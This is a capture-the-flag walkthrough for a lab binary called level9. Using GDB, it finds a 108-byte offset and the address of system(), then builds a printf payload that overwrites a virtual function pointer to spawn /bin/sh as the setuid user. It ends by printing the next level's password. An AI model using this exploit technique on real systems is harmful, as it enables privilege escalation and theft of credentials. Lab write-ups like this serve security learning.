# Level 9 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level9@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 bonus0 users 5140 Mar  6  2016 level9
	```

3. **Test the binary**

	```bash
	./level9
	./level9 AAAA
	./level9 AAAA AAAA
	```

	It exits.

4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level9@<vm-ip>:/home/user/level9/level9 .
	```

5.  **Analyze the binary in GDB**

	* The vulnerable code snippet:

	```
	0x08048690 <+156>:	mov    %eax,(%esp)
	0x08048693 <+159>:	call   *%edx
	0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
	0x08048698 <+164>:	leave  
	0x08048699 <+165>:	ret
	```

	* The offset to overwrite is `108` bytes (calculated as `2 ints * 4 bytes + setAnnotation 100 bytes`).
	* We aim to overwrite the memory at the address stored in `eax` to hijack control.

6. **Addresses of interest**

	Set a breakpoint at a key instruction where the virtual function is called:

	```gdb
	b *0x0804867c
	run AAAA AAAA
	info registers eax
	```

	Output:

	```
	eax            0x804a00c
	```

	Here, `%edx` holds a **virtual function pointer** and `eax` points to a memory location we want to overwrite.

7. **Find system address**

	```gdb
	p system
	```

	Output:

	```
	$1 = 0xb7d86060 <system>
	```

8. **Generate the payload**

	* Layout:

		```
		[ system address ][ padding 104 bytes ][ eax address ][ value to write (;/bin/sh) ]
		```

	* Payload command:

		```bash
		./level9 $(printf '\x60\x60\xd8\xb7' ; printf 'A%.0s' {1..104} ; printf '\x0c\xa0\x04\x08' ; printf ';/bin/sh')
		```

9. **Verify shell and get the password**

	```bash
	whoami
	```

	Output:

	```
	bonus0
	```

	```bash
	cat /home/user/bonus0/.pass
	```

	Output:

	```
	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
	```
